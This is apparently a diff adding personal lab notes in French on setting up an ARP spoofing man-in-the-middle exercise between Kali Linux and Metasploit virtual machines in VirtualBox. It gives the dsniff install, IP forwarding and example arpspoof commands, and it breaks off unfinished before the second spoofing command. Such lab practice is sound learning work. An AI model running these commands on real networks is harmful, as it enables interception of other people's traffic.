@@ -1,0 +1,28 @@
+Installation et configuration pour ARP Spoofing avec VirtualBox (Kali + Metasploit)
+
+1. Installation de VirtualBox  
+- Télécharger et installer VirtualBox depuis le site officiel.  
+
+2. Configuration des machines virtuelles (VM) Kali Linux et Metasploit  
+- Créer deux VM : une Kali Linux (attaquant) et une Metasploit (cible ou serveur).  
+- Configurer le réseau des VM en mode "Réseau interne" (Internal Network)  selon le besoin pour qu’elles puissent communiquer.  
+- Vérifier les interfaces réseau avec `ip link show` ou `ifconfig` pour identifier l’interface eth0.
+
+3. Préparation de l’attaque ARP Spoofing avec arpspoof  
+- Installer dsniff qui contient arpspoof :  
+  `sudo apt-get install dsniff`  
+- Activer le forwarding IP sur Kali pour router les paquets entre cible et passerelle :  
+  `sudo sysctl -w net.ipv4.ip_forward=1`  
+- Syntaxe correcte pour lancer arpspoof (version dsniff) :  
+  `sudo arpspoof -i <interface> -t <IP_cible> <IP_passerelle>`  
+- Exemple :  
+  `sudo arpspoof -i eth0 -t 192.168.1.101 192.168.1.1`  
+- Pour un MITM complet, lancer deux commandes en parallèle :  
+/////(c'est là où je me suis arrêtée :-) 
+
+
+BUT : 
+Pour s’assurer que l’attaque ARP spoofing est effective, il faut vérifier sur la machine cible
+que l’adresse IP de la passerelle (gateway) est associée à l’adresse MAC de la machine Kali, 
+ce qui peut être fait en consultant la table ARP avec la commande arp -a et en confirmant que
+l’entrée de la passerelle correspond bien à la MAC de Kali.
